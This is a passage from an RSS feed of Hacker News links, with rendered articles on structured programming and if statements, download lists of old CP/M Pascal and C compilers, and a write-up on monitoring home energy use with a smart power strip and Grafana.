<p>You can see from this example that, although powerful, jumps are much harder to work with than <code>if</code>-s, although they can sometimes make your code a bit shorter, they will 100% make it less readable which is hardly a good deal - if the important thing is for code to bug free, so youâ€™d always prefer to have a longer and more readable piece of code, than one which is shorter but harder to understand. This realization led to the rise of what was at the time called â€œstructural programmingâ€� paradigm, which was based on the idea that the power of jumps should not be exposed to the programmer - a point which was brought by Edsger W. Dijkstra in the seminal essay <a href="http://www.u.arizona.edu/~rubinson/copyright_violations/Go_To_Considered_Harmful.html">Go To Statement Considered Harmful</a> (<code>goto</code> is the equivalent of a <code>jump</code> instruction statements in non-assembly language context). Simultaneously, the idea of a <em>block</em> (or a â€œcompound statementâ€�) meaning a collection statements that perform a common task (usually denoted today by wrapping them in curly brackets) was pushed forward, and the two ideas gave birth to the <code>if</code> statement that we know today (that <a href="https://craftofcoding.wordpress.com/2017/04/29/the-evolution-of-if-i-from-fortran-i-to-algol-60/">first appeared in the <em>Algol 60</em> programming language</a>):</p>

<div><div><pre><code>if (input less than waterlevel) {
  turn motor on
} else if (input equal to waterlevel) {
turn motor off
} else {
...
</code></pre></div></div>

<p>The adoption of structured programming was a long process which began with people even questioning whether structured programs are even capable of encoding all possible computations, but today, although some people are <a href="https://stackoverflow.com/questions/46586/goto-still-considered-harmful">still defending the use of goto</a>, it (the process) is largely finished - <code>goto</code> is banished and the structured style of programming is so pervasive across modern languages that the term â€œstructuredâ€� is not used any more, simply because there is nothing to contrast it with.</p>

<p>And to reiterate, the reasons for this are quite obvious - using brackets makes our code much more akin to the way we usually talk and write with each other: we often say</p>

<blockquote>
  <p>â€œif A then B otherwise Câ€�</p>
</blockquote>

<p>we never say things like,</p>

<blockquote>
  <p>â€œif A then go to the previous page and start reading from line 12â€�.</p>
</blockquote>

<p>(I wonder if the programmers who defend the use of <code>goto</code> write and talk like that?)</p>

<p>This already leads me to the first rule that I always follow.</p>



<p>A leftover from the <code>goto</code>-driven style of programming is the possibility of so-called â€œearly exitâ€� - the ability to quit the execution of a given function or method from any place of itâ€™s body (most-oftenly by using the keyword <code>return</code>) as opposed to executing the function to the end. So again if we consider our plain old <code>if</code> <code>else</code> statement:</p>

<div><div><pre><code>if (input less than waterleve) {
    turn motor on
} else {
    turn motor off
}
...
</code></pre></div></div>
<p>Using <code>return</code> we can write it like this</p>

<div><div><pre><code>if (input less than waterleve) {
    return turn motor on
} 
turn motor off
...
</code></pre></div></div>

<p>When used like this, <code>return</code> is directly translatable to a <code>goto</code>.</p>

<div><div><pre><code>if (input less than waterleve) {
    turn motor on
    Jump to C
}
turn motor off
C:
...
</code></pre></div></div>

<p>Why not write like this? We already established that <code>goto</code> is bad and Iâ€™d argue that mixing the two approaches is even worse in some respects, as it might fool you that the code is structured when it really isnâ€™t. Furthermore, the early exit makes our code as confusing as any other <code>goto</code>-containing code when translated to natural language. Imagine someone saying:</p>

<blockquote>
  <p>â€œBring me a coffee if you get home early.â€�</p>
</blockquote>

<p>and then imagine them saying.</p>

<blockquote>
  <p>â€œIf you donâ€™t get home early ignore everything Iâ€™d say after this sentence. Bring me a coffee.â€�</p>
</blockquote>

<p>So if your language supports it, always rely on the implicit <code>return</code> instead of explicitly ending your execution. If not, the simple rule you can follow is that you should either return from all branches of the <code>if</code> statement or from none of them.</p>

<h2 id="combining-ifs-with-functions">Combining <code>if</code>â€™s with functions</h2>

<p>The most common type of situation that I have seen the premature <code>return</code> pattern is for handling errors. Imagine for example a very long function with some validation at the beginning. Many people would write:</p>

<div><div><pre><code>signup (user) {

  if (username is valid ) {
      throw invalid username
  } 

  create account for user
  sign user up
  initialise some other stuff
  write action in log
  send emails
  ...
}
</code></pre></div></div>

<p>This is a very subtle variant of the issue I am describing (made even more subtle by the fact that <code>throw</code> is used instead of a <code>return</code>). The correct way would be:</p>

<div><div><pre><code>signup (user) {

  if (username is valid ) {
      throw invalid username
  } else {
      create account for user
      sign user up
      initialise some other stuff
      write action in log
      send emails
    ...
  }
}
</code></pre></div></div>

<p>but people would prefer having the main function code directly in the body in order to avoid indentation (especially if there is a lot of it already). According to them (and they have a point) the error handling is somewhat outside of the domain of the function, we can perhaps say that they are at different levels of abstraction. In cases like this, we should use <em>functions</em> to structure our code and to keep the different levels of abstraction separate.</p>

<p>Functions are everything that random sequences of statement are not and can never be - they <em>have names</em>, they have <em>a separate scope</em> (blocks also have their own scope, but they also inherit the scope of the parent block), and most importantly they are <em>easy to debug</em> (e.g. you have the name of the thing that went wrong right there on the top of the stack trace. So letâ€™s look at how the code above can be made to work with functions. I think this is a very cool and underused pattern that allows you to lose the indentation without sacrificing your structure.</p>
<div><div><pre><code>
signup (user) {
  if (username is valid ) {
      throw invalid username
  } else {
      return signup internal (user)
  }
}

signup internal (user) { // or _signup as some people name it
  create account for user
  sign user up
  initialise some other stuff
  write action in log
  send emails
...
}
</code></pre></div></div>



<p>This is another bad pattern that, we might say, has the same root cause as the first one - in their effort to keep things simple and concise, people donâ€™t include all the structure that needs to be there in a robust piece of code.</p>

<p>In <code>if</code> statements we often have to deal with multiple conditions that are dependent on one another. And sometimes in such cases, people try to deal with all of them in one statement with multiple branches and <code>else if</code>-s. I argue that itâ€™s actually better to have <em>one statement per condition</em> …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://boris-marinov.github.io/if/">http://boris-marinov.github.io/if/</a></em></p>]]>
            </description>
            <link>http://boris-marinov.github.io/if/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786956</guid>
            <pubDate>Fri, 15 Jan 2021 04:18:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Old Pascal compilers for CP/M]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25786922">thread link</a>) | @peter_d_sherman
<br/>
January 14, 2021 | http://www.z80.eu/pas-compiler.html | <a href="https://web.archive.org/web/*/http://www.z80.eu/pas-compiler.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        <td>
                            
                            <p><span size="2">:... if you do not like C compiler&nbsp;!</span></p>
                            <p>Nikolaus Wirth invented 1970 a new programming language named 'PASCAL' (in fact it was influenced by&nbsp;<a href="http://www.algol68.org/">Algol</a>, see also <a href="http://www.xs4all.nl/~jmvdveer/algol.html">here</a> for a working compiler). Later this language was available also for CP/M. </p>
                            <p>As a foreword: I am offering the following compiler just for educational, non profit purpose. If any of the former copyright holder send me a mail that this is unwanted, I will immediately delete the concerned&nbsp;file.</p>
                            <p>Here are the Pascal&nbsp;compiler as complete packages (I do not offer every item by myself, instead, most of these offerings are just links to other sites):</p>
                            <p><a href="http://www.retroarchive.org/cpm/archive/unofficial/download/dripas.zip">Pascal MT+ compiler v. 5.5</a> Speed Programming Package included</p>
                            <p><a href="http://www.cpm.z80.de/download/mtp561.zip">Pascal MT+ compiler v. 5.6.1</a> also for CP/M</p>
                            <p><a href="http://www.cpm.z80.de/manuals/mtlang.zip">Pascal MT+ compiler v. 5.6.1 manual</a> in Postscript</p>
                            <p><a href="http://www.cpm.z80.de/manuals/spp.zip">PASCAL MT+ Speed programming package docu</a> in text format</p>
                            <p><a href="http://www.gaby.de/cpm/manuals/archive/mtplus/mtp_src.zip">PASCAL MT+ manual</a> in Word Format</p>
                            <p><a href="http://www.retroarchive.org/cpm/archive/unofficial/download/mtp80htm.zip">PASCAL MT+ manual</a> in HTML Format zipped</p>
                            <p><a href="http://www.iso.port.ac.uk/~mike/interests/chistory/documents/pascal-mt-manual/">Pascal MT+ Manual in HTML</a> online</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/TP_301A.ZIP">Turbo PASCAL 3.01A</a> for CP/M-80</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/tpas30.zip">Turbo PASCAL 3.0</a> for CP/M</p>
                            <p><a href="http://www.z80.eu/downloads/tp20a.zip">Turbo PASCAL 2.0</a> for CP/M (now complete, locally hosted)<br>
...and a patch&nbsp;for TP 2.0 <a href="http://www.z80.eu/downloads/TURBUSER.TXT">here</a> (fixes exit always to user 0)</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/tpas10.zip">Turbo PASCAL 1.0</a> for CP/M</p>
                            <p><a href="http://www.z80.eu/downloads/tp3-pat01.zip">Turbo PASCAL 3.01 Patches</a></p>
                            <p><a href="http://www.z80.eu/downloads/pdtins12.zip">Public Domain Turbo Pascal Terminal Installer</a> (PDTINS) version 1.2</p>
                            <p><a href="http://www.z80.eu/downloads/jrtpas20.zip">JRT PASCAL 2.0</a> for CP/M taken from SIGM Vol. 82 (locally hosted)</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/JRTPAS.ZIP">JRT PASCAL 2.2</a> for CP/M</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/JRTPAS30.ZIP">JRT PASCAL 3.0</a> for CP/M</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/JRTPAS40.ZIP">JRT PASCAL 4.0</a> for CP/M</p>
                            <p><a href="http://www.retroarchive.org/cpm/lang/PASCALZ4.ZIP">PASCAL/Z 4.0</a> for CP/M</p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/LANGUAGS/PASCAL-P/PP319UPD.LBR">PASCAL-P Compiler version 3.1.9</a> (from C.B. Falconer)</p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/LANGUAGS/PASCAL-P/PP319FIX.LBR">Fix to Pascal-P v 3.1.9</a></p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/LANGUAGS/PASCAL-P/PP319DOC.LBR">Documentation for Pascal-P</a></p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/LANGUAGS/PASCAL-P/PPMANUAL.PRN">Pascal-P Manual</a> (printed format)</p>
                            <p><a href="https://web.archive.org/web/20070204000316/http://cbfalconer.home.att.net/download/ppmanual.zip">Manual for PASCAL/P</a></p>
                            <p><a href="http://www.classiccmp.org/cpmarchives/cpm/mirrors/cbfalconer.home.att.net/download/cpm/pp.zip">Various PASCAL/P files</a></p>
                            <p><a href="http://www.z80.eu/downloads/pascal.zip">"Pascal Pascal Compiler" v1 from Robert A. Van Valzah</a><br>
 (locally hosted, from 1980)</p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/SIMTEL/CPMUG/CPMUG050.ARK">"Pascal Pascal Compiler" v2 from Robert A. Van Valzah</a> from SIMTEL CPMUG 050, this seems to be a more complete but different version</p>
                            <p><br>
Interesting source code for Pascal MT+ or Turbo PASCAL:</p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/CMDMAK.html">PASCAL MT+ Source Show Directory</a> (all USER areas)</p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/DirString.html">TPASCAL 3.0 Show Directory 1</a></p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/Wildcards.html">TPASCAL 3.0 Show Directory 2</a></p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/TurboDir.html">TPASCAL 3.0 Show Directory 3</a></p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/TurboDirectory.html">TPASCAL 3.0 Show Directory 4</a></p>
                            <p><a href="http://www.cirsovius.de/CPM/Projekte/Artikel/TP/Inhalt/DirectoryPascal.html">TPASCAL 3.0 Show Directory 5</a></p>
                            <p><a href="http://www.z80.eu/downloads/TPLESSN1.ARC">Turbo PASCAL Lessons&nbsp;Disk 1</a> (locally hosted)</p>
                            <p><a href="http://www.z80.eu/downloads/TPLESSN2.ARC">Turbo PASCAL Lessons&nbsp;Disk 2</a> (locally hosted)</p>
                            <p><a href="http://www.z80.eu/downloads/tptutor.zip">Turbo PASCAL Tutor</a> (locally hosted)</p>
                            <p><a href="http://www.retroarchive.org/cpm/cdrom/CPM/TURBOPAS/TKERMIT.LBR">Kermit in Turbo PASCAL</a></p>
                            <p><a href="http://www.z80.eu/downloads/usq141.zip">Unsqueezer source code</a> in Turbo PASCAL (locally hosted)</p>
                            <p>A <a href="http://www.z80.eu/downloads/asmz80.zip">Z80 Assembler written in Turbo PASCAL 3.0</a> source code and executable included, source file was shrinked with a tool named PCRYPT (runs under DOS), because it's too big for the editor. Very useful.</p>
                            <p><a href="http://www.z80.eu/downloads/paspretty80.zip">Pascal "pretty" formatter</a> source code (locally hosted)</p>
                            <p>Very interesting is also the PASCAL P&nbsp;compiler in <u><i>source code</i></u>:</p>
                            <p><a href="http://homepages.cwi.nl/~steven/pascal/">PASCAL Compiler and Interpreter</a>, produces P4 Code, source files for compiling with another PASCAL-Compiler or with a C-Compiler.</p>
                            
                            <p><a href="http://www.schorn.ch/cpm/zip/ucsd.zip">USCD Pascal II.9</a> for Altair Simulator/SIMH</p>
                            <p><a href="http://www.autometer.de/unix4fun/z80pack/ucsdpascalvii.pdf">USCD Pascal Manual</a> in PDF</p>
                            <p><a href="http://invent.ucsd.edu/technology/cases/1995-prior/I.5Sources.zip">UCSD Pascal I.5</a> Sources</p>
                            <p>I rediscovered a very old archive file with UCSD version I.3 files.<br>
Though I am unsure about an interest and if it's already mirrored or not,<br>
 I show you the contents of the archive file <a href="http://www.z80.eu/UCSD.html">here</a>, but at the moment I am not offering any downloadable file, because there might be files included, which are of personal nature.</p>
                            <p><span color="#990000"><b><i>New:</i></b></span> Please take a look also at <a href="http://www.z80.eu/mod2-compiler.html">my new Modula-2 page</a>.<br>
&nbsp;</p>
                        </td>
                    </div></div>]]>
            </description>
            <link>http://www.z80.eu/pas-compiler.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786922</guid>
            <pubDate>Fri, 15 Jan 2021 04:13:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Old C compilers for CP/M]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25786918">thread link</a>) | @peter_d_sherman
<br/>
January 14, 2021 | http://www.z80.eu/c-compiler.html | <a href="https://web.archive.org/web/*/http://www.z80.eu/c-compiler.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div width="548">
                <h2><br>
<img src="http://www.z80.eu/images/nth_theme_blue_blue13_bullet_s.gif">
 C compiler for CP/M - there are a lot of them ...</h2>
                <div><p><b><span color="#0000CC">What compiler should somebody use for programming CP/M applications ...</span></b><span size="2"><br>
:... if you do not like or just do not want to use Turbo PASCAL 3.0 ?</span></p><p>

Since 1973 (<a href="https://www.bell-labs.com/usr/dmr/www/primevalC.html">earliest versions of 'C'</a>) many C compilers were published, of course also for CP/M. Some of them surprisingly offers floating number support, some of them are at least K&amp;R (Kernighan-Ritchie) standard compatible.</p></div>
                <p>As a foreword: I am offering the following compiler just for educational, non profit purpose. If any of the former copyright holder send me a mail that this is unwanted, I will immediately delete the concerned&nbsp;file.</p>
                <p>Here are the C compiler as complete packages:</p>
                <p><a href="http://www.z80.eu/downloads/arnor-c100.zip">Arnor C 1.00</a> (no math lib, originally for Amstrad CPCs)</p>
                <p><a href="http://www.z80.eu/downloads/ASCII-C11.zip">ASCII C 1.1</a> (for MSX-DOS, which is almost CP/M compatible)</p>
                <p><a href="http://www.z80.eu/downloads/Aztec-C106d.zip">Aztec C 1.06d</a></p>
                <p><a href="http://www.z80.eu/downloads/bdsc-all.zip">BDS-C 1.6 &amp; 2.0</a> (complete package for CP/M + ZCPR3)</p>
                <p><a href="http://www.z80.eu/downloads/ECO-C343.zip">Ecosoft C Compiler 3.43</a> (Z80; thanks to Rolf Harrmann !)</p>
                <p><a href="http://www.z80.eu/downloads/z80v309.lzh">HiTech C 3.09</a> (Z80. locally mirrored) and a manual for it (<a href="http://www.z80.eu/downloads/z80doc.zip">locally mirrored</a>)</p>
                <p><a href="http://www.z80.eu/downloads/HiSoft-C135.zip">HiSoft C 1.35</a></p>
                <p><a href="http://www.z80.eu/downloads/ManxC105.zip">ManxC 1.05</a></p>
                <p><a href="http://www.z80.eu/downloads/mi_c_318.zip">Mi-C 3.18</a></p>
                <p><a href="http://www.z80.eu/downloads/mix-c20.zip">Mix C Compiler 2.0</a></p>
                <p>Mix C Compiler 2.1 - see <a href="http://www.cpm8680.com/mix/index.htm">Bill Buckels web pages</a></p>
                <p><a href="http://www.z80.eu/downloads/c80v31a.zip">Q/C Compiler V3.1a</a> (Z80, Codeworks aka Quality Computer Systems)</p>
                <p><a href="http://www.z80.eu/downloads/SIL15new.zip">SIL 1.5 from Digilog</a> (with a subset of C, but with some other extensions)</p>
                <p><a href="http://www.z80.eu/downloads/smallc21.zip">Small C 2.1</a> (no float, partly K &amp; R, source exists <a href="http://z80cpu.eu/mirrors/ftp.mayn.de/pub/cpm/archive/smallc21/">here</a>)</p>
                <p><a href="http://www.z80.eu/downloads/small_c_27.zip">Small C 2.7</a> (created by F. A. Scacchitti in Oct. 1986)</p>
                <p><a href="http://www.z80.eu/downloads/Small-C-wfloats.zip">Small C 1.2 with floats</a> (Z80, SIG/M 224)</p>
                <p><a href="http://www.z80.eu/downloads/SmallCplus.zip">Small C/Plus with floats and structs/unions</a> (v1.0, 1988)</p>
                <p>Another <i>Small C</i> variant named <i>MESCC</i> with code optimizations&nbsp;from Miguel I. García López can be found at <a href="http://www.floppysoftware.es/mescc.html">his webpage</a> , an old&nbsp;local mirror is <a href="http://www.z80.eu/downloads/mescc101.zip">here</a> (he has also a <a href="https://github.com/MiguelVis/RetroProjects/tree/master/mescc">Github page</a> with a current version)</p>
                <p><a href="http://www.z80.eu/downloads/ssoft-c-13.zip">Supersoft C 1.3</a> (not sure all needed files are included, plz feedback)</p>
                <p><a href="http://www.z80.eu/downloads/WhiteSmithC20.zip">Whitesmith C 2.0</a> (seems complete)</p>
                <p><a href="http://www.z80.eu/downloads/WhiteSmithC21.zip">Whitesmith C 2.1</a> (now also complete !)</p>
                <p><br>
Some additional info to interpreters for C or C-alike languages:</p>
                <p><a href="http://primepuzzle.com/tiny-c/TINY-C.LBR">Tiny-C</a> CP/M version&nbsp;(C alike interpreter for learning purposes)</p>
                <p><a href="http://www.z80.eu/downloads/SCI-12.zip">"Small C" Interpreter 1.2</a> from Bob Brodt (real C)</p>
                <p> Interesting for Small C enthusiasts can be <a href="http://www.project-fbin.hostoi.com/index.htm">this site</a>, it contains also some historical background to Small-C and CP/M.</p>
                <p>Dave Dunfield's "<a href="http://www.classiccmp.org/dunfield/dos/mc323pc.zip">Micro C</a>" which can produce also <a href="http://www.classiccmp.org/dunfield/dos/mc323d85.zip">8080 code</a>, please visit also his great pages at <a href="http://www.dunfield.com/">http://www.dunfield.com/</a></p>
                <p><a href="http://tack.sourceforge.net/">The Amsterdam Compiler Kit</a> can produce also executables for CP/M (8080 code).</p>
                <p><i>New:</i> <span><a href="http://sdcc.sourceforge.net/">sdcc - a retargettable, optimizing&nbsp;ANSI C-Compiler Suite</a> (also for Z80)</span></p>
                <p>Last but not least the <a href="http://www.z88dk.org/wiki">z88dk</a> (not only for the z88, it's a cross development tool for several platforms) should me mentioned here also.</p>
                <h2><img src="http://www.z80.eu/images/nth_theme_blue_blue13_new.gif"><u><b>Tests of compatibility</b></u>:</h2>
                <p>I choosed&nbsp;an unusual source code, AES256 Encryption and Decryption from &gt;<a href="http://www.literatecode.com/2007/11/11/aes256/">Literatecode</a>&lt;, which is a quite complex program&nbsp;for CP/M-80.</p>
                <p>I had to change the source code to K&amp;R syntax (good old days), and had to shorten the subroutine names a bit (remember, there's a small limit for external symbol names, which is totally unusual for current C compiler&nbsp;!).<br>
Also, I defined a pointer type for easier subroutine parameter declaration.</p>
                <div><p>For convinience reasons, I did not take <i>aes256.h</i> for type definitions.</p><p>

I was a bit surprised after I got it </p><u><span color="#990000">really working</span></u><p> - at least with HiTech C.<br>
All other C compiler hat their own, special problems, e.g. producing assembler or object code didn't work due to more restrictions for external symbols, or just errors when linking it together.</p><p>

This is the output of the CP/M-80 AES256 demo program:</p><p><span face="Courier New">B&gt;demo<br>
txt: 00 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF<br>
key: 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 16 17 18<br>
19 1A 1B 1C 1D 1E 1F<br>
---<br>
enc: 8E A2 B7 CA 51 67 45 BF EA FC 49 90 4B 49 60 89<br>
tst: 8e a2 b7 ca 51 67 45 bf ea fc 49 90 4b 49 60 89<br>
dec: 00 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF<p>
&nbsp;
B&gt;</p></span></p></div>
                <p>And here is the source code with the readily compiled CP/M-80 executable:<br>
&gt;<a href="http://www.z80.eu/downloads/aes256.zip">aes256.zip</a>&lt;<br>
(<i>aes256.h </i>is not included as a separate file, it's integrated within the source)<br>
The CP/M-80 executable included is the above shown <i>demo.com</i>.<br>
So it would be possible to write your own CP/M-80 encryption program (think about the execution speed... you have to be patient).</p>
            </div></div>]]>
            </description>
            <link>http://www.z80.eu/c-compiler.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786918</guid>
            <pubDate>Fri, 15 Jan 2021 04:13:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mapping the videos of the Capitol building attack]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25786731">thread link</a>) | @basicplus2
<br/>
January 14, 2021 | https://thepatr10t.github.io/yall-Qaeda/ | <a href="https://web.archive.org/web/*/https://thepatr10t.github.io/yall-Qaeda/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://thepatr10t.github.io/yall-Qaeda/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786731</guid>
            <pubDate>Fri, 15 Jan 2021 03:40:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Energy Monitoring Using Smart Plug and Raspberry Pi]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25786607">thread link</a>) | @anuragpeshne
<br/>
January 14, 2021 | https://anuragpeshne.github.io/essays/energy-monitoring.html | <a href="https://web.archive.org/web/*/https://anuragpeshne.github.io/essays/energy-monitoring.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">


<p>
Recently, I became interested in measuring the electricity consumption
of electronic devices at my home and, in particular, my computer. Computer power
supplies are typically rated from 400W to 800W. I wanted to see how much power is
actually needed for day-to-day computing - writing code, browsing the Internet, playing
games, running ML jobs. And how does it compare with a laptop and other mobile devices.
</p>

<p>
As a kid, I was once told by an engineer that the bulk of the energy is consumed by
the monitor, and the desktop itself consumes lesser energy<sup><a id="fnr.1" href="#fn.1">1</a></sup>. So if I switch off
the monitor, I can play music, download things overnight without wasting too much
energy. This statement stuck with me over time as my bulky CRT monitor was replaced
with sleek LED monitors and a beefy 250W GPU got added to my desktop. It was time
I measure everything and find out if the engineer's statement still holds.
</p>


<div id="orgc5b562d">
<p><img src="https://anuragpeshne.github.io/assets/energyMonitoring/desktop.png" alt="desktop.png">
</p>
<p><span>Figure 1: </span>Desktop energy consumption on a weekend evening.</p>
</div>

<div id="outline-container-orga6a4ce1">
<h2 id="orga6a4ce1">Hardware</h2>
<div id="text-orga6a4ce1">
<p>
A quick search revealed that <a href="https://en.wikipedia.org/wiki/Kill_A_Watt">Kill A Watt</a> meters are one of the most popular ways
of measuring the energy consumption. I wanted to log the consumption so that I can
analyze the trends over time. That's why I passed these meters on. But these meters
have an inbuilt screen and do not require mobile or network access so they can
be a great solution if someone is looking for a quick way to see the consumption.
On the other end of the spectrum, there are some devices that can be plugged directly
into the circuit panel of the house and they can be used to analyze consumption
of all appliances in the house. For my goal of measuring energy consumption of
my computer, this was simply overkill and would not have provided the fine-grained
monitoring I needed (and I'm a little scared of messing with the AC power).
</p>

<p>
I finally settled on TP-Link Power Strip: <a href="https://www.kasasmart.com/us/products/smart-plugs/kasa-smart-wi-fi-power-strip-hs300">HS300</a>. This <i>smart</i> power strip has
the usual <i>smart</i> plug features, like, it can be controlled using a mobile app, but
it also has energy monitoring built-in. And most importantly there are some awesome projects
on Github - <a href="https://github.com/python-kasa/python-kasa">python-kasa</a>, <a href="https://github.com/GadgetReactor/pyHS100">pyHS100</a> - that have reverse engineered the communication
protocol and provide a nice interface to talk to them.
</p>
</div>
</div>

<div id="outline-container-org01d1f27">
<h2 id="org01d1f27">Software</h2>
<div id="text-org01d1f27">



<p>
Figure 2<sup><a id="fnr.2" href="#fn.2">2</a></sup> shows a high-level picture of how the energy consumption values
get extracted, stored and visualized.
</p>
</div>

<div id="outline-container-orgd7e2f19">
<h3 id="orgd7e2f19">Polling HS300</h3>
<div id="text-orgd7e2f19">
<p>
The project <a href="https://github.com/python-kasa/python-kasa">python-kasa</a> provides a nice interface to control TP-Link devices but there's
an <a href="https://github.com/python-kasa/python-kasa/issues/64">issue</a> with querying the energy monitor of child plugs. That's why I used the project <a href="https://github.com/GadgetReactor/pyHS100">pyHS100</a>
which seems like an older version of the python-kasa project. I added a cron job to query
the power strip every 5 minutes and dump the data in a text file, using a simple bash script:
</p>
<div>
<pre><code>#! /bin/bash

power=$(/home/pi/.local/bin/pyhs100 --strip --host &lt;IP of the power strip&gt; emeter | tail -n 1)
timestamp=$(date +%s)

echo -e "$timestamp, $power"
</code></pre>
</div>
<p>
This creates a bulky line for each sample it records and there is certainly a
lot of room to compress it. I'm currently sampling it every 5 minutes, so I don't
mind it, but if you are planning to sample it every minute or every few seconds,
you might want to trim it down.
</p>
</div>
</div>

<div id="outline-container-orgd23b686">
<h3 id="orgd23b686">Grafana Datasource</h3>
<p>
I'm using Grafana to visualize this data to see trends in usage over time. We
can dump all of the data into one of the Datasource that is supported by default
by Grafana but I did not like that extra step for such simple data. So I wrote
<a href="https://github.com/anuragpeshne/grafana-kasa-power-strip">my own backend datasource</a> that directly serves Grafana, data from the logs we
collected. This uses the <a href="https://grafana.com/grafana/plugins/grafana-simple-json-datasource">SimpleJson</a> datasource plugin.
</p>
</div>
</div>

<div id="outline-container-orgfc16d58">
<h2 id="orgfc16d58">Results</h2>
<p>
The results were informative and nothing less than an eye-opener for me. Some devices,
like computers, chargers, consume varying amounts of energy, and some devices, like
lamps, monitors, consume constant energy. I might write a follow-up post just
about the consumption of my computer running various workloads and applications.
Here are few that I found interesting:
</p>
<div id="outline-container-org12fd4a3">
<h3 id="org12fd4a3">Desktop: Coding vs video games</h3>
<div id="text-org12fd4a3">

<div id="org9712a5d">
<p><img src="https://anuragpeshne.github.io/assets/energyMonitoring/desktop.png" alt="desktop.png">
</p>
<p><span>Figure 3: </span>Desktop energy usage: coding, standby, then, playing video games</p>
</div>
<ul>
<li>In the first half, the computer was used for coding using a simple text editor with light browsing.</li>
<li>The drop represents the time it was put on sleep.</li>
<li>The increase during the later part corresponds with playing a low graphics
demanding game.</li>
</ul>
</div>
</div>
<div id="outline-container-orgdec0c27">
<h3 id="orgdec0c27">Monitor</h3>
<div id="text-orgdec0c27">

<div id="org105d4a8">
<p><img src="https://anuragpeshne.github.io/assets/energyMonitoring/monitor.png" alt="monitor.png">
</p>
<p><span>Figure 4: </span>Computer Monitor consumption: almost constant</p>
</div>
<ul>
<li>Energy consumption of my monitor is constant until I increased the brightness from 15% to 20%</li>
</ul>
</div>
</div>
<div id="outline-container-org928d531">
<h3 id="org928d531">Phone charging</h3>
<div id="text-org928d531">

<div id="orga4f7883">
<p><img src="https://anuragpeshne.github.io/assets/energyMonitoring/iphone_charging.png" alt="iphone_charging.png">
</p>
<p><span>Figure 5: </span>iPhone getting charged using the stock charger.</p>
</div>
<ul>
<li>This curve is interesting - an exponential decay.</li>
<li>Note the spikes too, maybe those correspond with the times the phone was picked up.</li>
</ul>
</div>
</div>
</div>

<div id="outline-container-org82c2bcb">
<h2 id="org82c2bcb">Conclusion</h2>
<div id="text-org82c2bcb">
<p>
The energy consumption of the monitor is just 10% - 25% of the desktop energy consumption.
So, although it might be still a good idea to turn off the monitor when things
are running in the background, monitors are not the major consumers anymore
(if they were at all earlier). It is interesting to note that the actual
consumption is much less than the rated wattage of the devices.
</p>

<p>
It is also interesting to note the difference in magnitude of the consumption.
So getting a gold rated PSU will have much more impact than having a more efficient
iPhone charger. But none of this matters when you are sitting next to a 3KW space heater ;)
</p>
</div>
</div>
<p><a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" src="https://i.creativecommons.org/l/by/4.0/80x15.png"></a></p>

</div></div>]]>
            </description>
            <link>https://anuragpeshne.github.io/essays/energy-monitoring.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786607</guid>
            <pubDate>Fri, 15 Jan 2021 03:21:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Composability of software components is the biggest benefit of K8s]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25786449">thread link</a>) | @airocker
<br/>
January 14, 2021 | https://lab.computer/static/blogs_p/jekyll/pixyll/2020/10/10/k8s-saas/ | <a href="https://web.archive.org/web/*/https://lab.computer/static/blogs_p/jekyll/pixyll/2020/10/10/k8s-saas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
    <div role="main">
      <div>
        




<article>
  <p><em>Pankaj Kumar</em></p>

<p><strong>Encapsulation in Kubernetes</strong></p>

<p>In 2018, for various reasons we moved our website to Kubernetes. When we started, we had little idea what Kubernetes had to offer. All we knew was that it can run a website based on containers that are full OS images. It is easier to move from one cloud provider to another. Cool! Little did we know the biggest advantage it offers: Encapsulation.</p>

